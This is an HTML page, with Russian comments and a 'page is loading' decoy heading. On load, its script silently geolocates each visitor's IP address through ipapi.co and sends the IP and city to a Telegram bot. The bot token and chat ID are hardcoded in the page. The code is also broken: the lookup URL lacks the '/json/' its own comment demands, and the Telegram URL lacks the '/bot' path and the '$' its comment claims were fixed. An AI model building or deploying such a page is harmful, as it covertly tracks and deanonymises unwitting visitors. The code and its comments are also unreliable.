<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <h1 id="status">Страница загружается... (v3.0)</h1>

    <script>
        async function run() {
            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
            const chat_id = "8426763446";

            try {
                // 1. Получаем IP (ОБЯЗАТЕЛЬНО /json/ в конце)
                const res = await fetch('https://ipapi.co');
                const data = await res.json();

                // 2. Формируем сообщение
                const text = `IP: ${data.ip} | City: ${data.city}`;

                // 3. Отправляем в ТГ (ИСПРАВЛЕННЫЙ URL с /bot и /sendMessage)
                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;

                await fetch(url);
                document.getElementById('status').innerText = "Готово! Сообщение в Telegram.";
            } catch (e) {
                document.getElementById('status').innerText = "Ошибка: " + e;
                console.error(e);
            }
        }
        run();
    </script>
</body>
</html>
